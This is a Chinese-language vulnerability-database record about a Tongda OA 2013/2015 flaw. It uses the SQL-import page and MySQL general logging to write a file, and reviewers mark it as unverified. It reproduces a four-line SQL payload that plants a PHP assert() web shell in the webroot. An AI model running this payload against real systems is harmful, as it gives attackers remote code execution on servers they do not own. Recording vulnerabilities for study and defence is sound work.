---
source: "hatch 补库批 20260928"
title: "通达OA 数据库脚本导入日志写入链"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2013/2015；MySQL日志权限/PHP assert配置"
prerequisites: "未明但需SQL导入管理功能"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%84%9A%E6%9C%AC%E5%AF%BC%E2%BC%8Agetshell.md"
category_recommendation: "OA / 通达"
id: "vw-729afa1b8bc684a6d4e1b298"
entity_id: "ve-729afa1b8bc684a6d4e1b298"
schema_version: "1"
---

# 通达OA 数据库脚本导入日志写入链

## 条目说明

- 对象与具体问题：通达OA；数据库脚本导入日志写入链
- 版本、配置及部署条件：2013/2015；MySQL日志权限/PHP assert配置
- 认证与权限前提：未明但需SQL导入管理功能
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 功能高权限到OS文件写入的组合，非无条件漏洞
- 有关闭日志但未恢复原路径/状态或删文件，缺端点/请求/证据
- 无版本来源

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

⾥面的database⻚面可以导入sql脚本文件,但是系统过滤了很多,有很多的限制,使⽤mysql日志的方式进行
突破。

    set global general_log = on;
    set global general_log_file = '../webroot/test.php';
    select '<?php assert($_POST[a]) ?>';
    set global general_log = off
